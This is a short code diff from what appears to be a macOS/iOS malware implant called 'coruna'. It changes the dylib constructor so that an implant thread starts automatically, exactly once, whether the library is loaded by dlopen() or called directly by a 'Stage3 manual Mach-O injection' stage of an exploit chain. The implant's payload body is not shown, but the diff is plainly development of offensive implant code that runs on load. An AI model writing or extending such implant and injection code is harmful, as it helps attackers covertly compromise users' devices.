@@ -126,10 +126,21 @@ static void *implant_main(void *arg) {
     return NULL;
 }
 
-/* ── dylib constructor ──────────────────────────────────────────────────────── */
+/* ── dylib constructor / manual entry ───────────────────────────────────────
+ *
+ * Called in two scenarios:
+ *   1. Traditional dlopen() load  → __attribute__((constructor)) fires automatically.
+ *   2. Stage3 manual Mach-O injection → stage3_entry.c:process() calls us directly.
+ *
+ * dispatch_once ensures the implant thread is spawned exactly once regardless
+ * of which path (or both paths, in future hybrid chains) triggers the call.
+ * ─────────────────────────────────────────────────────────────────────────── */
 __attribute__((constructor))
 void coruna_constructor(void) {
-    pthread_t tid;
-    if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
-        pthread_detach(tid);
+    static dispatch_once_t _spawn_once;
+    dispatch_once(&_spawn_once, ^{
+        pthread_t tid;
+        if (pthread_create(&tid, NULL, implant_main, NULL) == 0)
+            pthread_detach(tid);
+    });
 }
